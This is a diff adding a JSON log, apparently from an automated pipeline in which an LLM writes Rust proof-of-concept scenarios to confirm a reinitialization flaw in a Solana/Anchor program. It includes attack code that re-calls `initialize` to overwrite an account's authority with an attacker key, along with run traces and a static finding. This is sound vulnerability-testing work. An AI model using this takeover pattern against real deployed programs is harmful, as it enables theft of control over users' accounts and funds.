+                "head": "0100000000000000",
+                "digest": "491a430b19faf7bd",
+                "post": "010000000000000002000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "reinitialize com authority atacante",
+            "result": "Success",
+            "compute_units": 1207,
+            "account_flags": "-w,sr",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 33,
+                "head": "0100000000000000",
+                "digest": "491a430b19faf7bd",
+                "post": "010000000000000003000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "authority sobrescrita pelo atacante",
+            "holds": true
+          },
+          {
+            "step": "effect",
+            "note": "authority diferente da legitima",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 1207 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 1207 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o ataque nao exercita a hipotese de REINIT: e preciso que a instrucao do ataque seja a mesma do baseline e uma conta com dados chegue ao ataque com estado diferente do que tinha no baseline (ex.: o estado ja inicializado em resultado.resulting_accounts). Mantenha o baseline como uso legitimo e faca no ataque exatamente essa mudanca."
+    },
+    {
+      "attempt": 5,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2914,
+        "completion_tokens": 722,
+        "latency_s": 3.59
+      },
+      "raw": "{\"plan\": \"O baseline chama `initialize` legitimamente sobre uma conta `user` com dados brutos (discriminator=true, authority=legit_authority), provando que o cenario esta montado. O ataque chama a MESMA instrucao `initialize` sobre a mesma conta `user` ja inicializada (estado vindo de resulting_accounts do baseline), mas com `authority` = atacante. Se o programa nao verificar reinicializacao, a authority sera sobrescrita; medimos isso lendo o Pubkey no offset 1 dos dados apos o ataque.\", \"scenario\": \"let program_id = env.program_id;\\n\\nlet legit_authority = Pubkey::new_unique();\\nlet attacker_authority = Pubkey::new_unique();\\nlet user_key = Pubkey::new_unique();\\n\\n// Conta user com dados brutos: bool(true) + Pubkey(legit_authority)\\nlet mut user_data = Vec::new();\\nuser_data.push(1u8);\\nuser_data.extend_from_slice(legit_authority.as_ref());\\nlet user_account = account(&program_id, &user_data, None);\\n\\nlet contas_baseline = vec![\\n    (user_key, user_account.clone()),\\n    (legit_authority, wallet(1_000_000_000)),\\n];\\n\\nlet ix_baseline = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(),\\n    vec![\\n        AccountMeta::new(user_key, false),\\n        AccountMeta::new_readonly(legit_authority, true),\\n    ],\\n);\\n\\nlet r_baseline = env.baseline(\\\"initialize legitimo\\\", &ix_baseline, &contas_baseline);\\n\\n// Estado da conta user apos o baseline (ja inicializada)\\nlet user_after_baseline = after(&r_baseline, &user_key).clone();\\n\\nlet contas_attack = vec![\\n    (user_key, user_after_baseline),\\n    (attacker_authority, wallet(1_000_000_000)),\\n];\\n\\nlet ix_attack = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(),\\n    vec![\\n        AccountMeta::new(user_key, false),\\n        AccountMeta::new_readonly(attacker_authority, true),\\n    ],\\n);\\n\\nlet r_attack = env.attack(\\\"reinitialize com authority atacante\\\", &ix_attack, &contas_attack);\\n\\nif r_attack.program_result == ProgramResult::Success {\\n    let user_data_after = after(&r_attack, &user_key).data();\\n    let authority_after = read_pubkey(user_data_after, 1);\\n    env.effect(\\n        \\\"authority sobrescrita pelo atacante\\\",\\n        authority_after == attacker_authority,\\n    );\\n    env.effect(\\n        \\\"authority diferente da legitima\\\",\\n        authority_after != legit_authority,\\n    );\\n}\\n\"}",
+      "plan": "O baseline chama `initialize` legitimamente sobre uma conta `user` com dados brutos (discriminator=true, authority=legit_authority), provando que o cenario esta montado. O ataque chama a MESMA instrucao `initialize` sobre a mesma conta `user` ja inicializada (estado vindo de resulting_accounts do baseline), mas com `authority` = atacante. Se o programa nao verificar reinicializacao, a authority sera sobrescrita; medimos isso lendo o Pubkey no offset 1 dos dados apos o ataque.",
+      "scenario": "let program_id = env.program_id;\n\nlet legit_authority = Pubkey::new_unique();\nlet attacker_authority = Pubkey::new_unique();\nlet user_key = Pubkey::new_unique();\n\n// Conta user com dados brutos: bool(true) + Pubkey(legit_authority)\nlet mut user_data = Vec::new();\nuser_data.push(1u8);\nuser_data.extend_from_slice(legit_authority.as_ref());\nlet user_account = account(&program_id, &user_data, None);\n\nlet contas_baseline = vec![\n    (user_key, user_account.clone()),\n    (legit_authority, wallet(1_000_000_000)),\n];\n\nlet ix_baseline = env.anchor_ix(\n    \"initialize\",\n    &(),\n    vec![\n        AccountMeta::new(user_key, false),\n        AccountMeta::new_readonly(legit_authority, true),\n    ],\n);\n\nlet r_baseline = env.baseline(\"initialize legitimo\", &ix_baseline, &contas_baseline);\n\n// Estado da conta user apos o baseline (ja inicializada)\nlet user_after_baseline = after(&r_baseline, &user_key).clone();\n\nlet contas_attack = vec![\n    (user_key, user_after_baseline),\n    (attacker_authority, wallet(1_000_000_000)),\n];\n\nlet ix_attack = env.anchor_ix(\n    \"initialize\",\n    &(),\n    vec![\n        AccountMeta::new(user_key, false),\n        AccountMeta::new_readonly(attacker_authority, true),\n    ],\n);\n\nlet r_attack = env.attack(\"reinitialize com authority atacante\", &ix_attack, &contas_attack);\n\nif r_attack.program_result == ProgramResult::Success {\n    let user_data_after = after(&r_attack, &user_key).data();\n    let authority_after = read_pubkey(user_data_after, 1);\n    env.effect(\n        \"authority sobrescrita pelo atacante\",\n        authority_after == attacker_authority,\n    );\n    env.effect(\n        \"authority diferente da legitima\",\n        authority_after != legit_authority,\n    );\n}\n",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "initialize legitimo",
+            "result": "Success",
+            "compute_units": 1207,
+            "account_flags": "-w,sr",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 33,
+                "head": "0100000000000000",
+                "digest": "491a430b19faf7bd",
+                "post": "010000000000000002000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "reinitialize com authority atacante",
+            "result": "Success",
+            "compute_units": 1207,
+            "account_flags": "-w,sr",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 33,
+                "head": "0100000000000000",
+                "digest": "491a430b19faf7bd",
+                "post": "010000000000000003000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "authority sobrescrita pelo atacante",
+            "holds": true
+          },
+          {
+            "step": "effect",
+            "note": "authority diferente da legitima",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 1207 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 1207 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.6
+      },
+      "verdict": null,
+      "reason": "o ataque nao exercita a hipotese de REINIT: e preciso que a instrucao do ataque seja a mesma do baseline e uma conta com dados chegue ao ataque com estado diferente do que tinha no baseline (ex.: o estado ja inicializado em resultado.resulting_accounts). Mantenha o baseline como uso legitimo e faca no ataque exatamente essa mudanca."
+    }
+  ],
+  "case_id": "SL-04-SEC",
+  "static_finding": {
+    "category": "REINIT",
+    "confidence": "high",
+    "evidence": "if !user.discriminator {\n    return Err(ProgramError::InvalidAccountData.into());\n}\n\nuser.authority = ctx.accounts.authority.key();\nuser.discriminator = true;",
+    "explanation": "A instrucao `initialize` grava dados na conta `user` sem verificar se ela ja foi inicializada anteriormente. O campo `discriminator` e definido como `true` apos a escrita, mas nao ha verificacao de que ele ja era `true` antes, permitindo que a instrucao seja executada repetidamente sobre a mesma conta.",
+    "attack_hypothesis": "Um atacante chama `initialize` novamente sobre uma conta `user` ja inicializada, sobrescrevendo `authority` com sua propria chave e assumindo o controle da conta."
+  }
+}
